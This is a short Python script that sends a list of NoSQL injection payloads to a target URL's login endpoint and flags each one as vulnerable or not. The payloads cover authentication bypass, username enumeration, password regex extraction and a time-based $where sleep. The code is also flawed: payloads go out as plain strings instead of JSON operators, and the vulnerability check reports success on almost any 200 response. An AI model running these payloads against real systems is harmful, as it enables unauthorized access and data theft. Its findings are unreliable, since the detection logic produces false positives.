import requests
import logging

# ✅ Common NoSQL Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    '{"$gt": ""}',                   # Attempt to bypass authentication
    '{"$ne": ""}',                   # Test for data leakage
    '{"username": {"$exists": true}}', # Find valid usernames
    '{"password": {"$regex": ".*"}}', # Extract password data
    '{"$where": "sleep(5000)"}',       # Time-based NoSQL injection
]

def check_nosql_injection(target_url):
    """
    Tests a given URL for NoSQL injection vulnerabilities.
    """
    results = []

    for payload in NOSQL_INJECTION_PAYLOADS:
        try:
            headers = {"Content-Type": "application/json"}
            test_url = target_url  # Assuming JSON-based API authentication
            response = requests.post(test_url, json={"username": payload, "password": "test"}, headers=headers, timeout=5)

            # ✅ Check if unexpected behavior occurs
            if response.status_code == 200 or "error" not in response.text.lower():
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})

        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")

    return results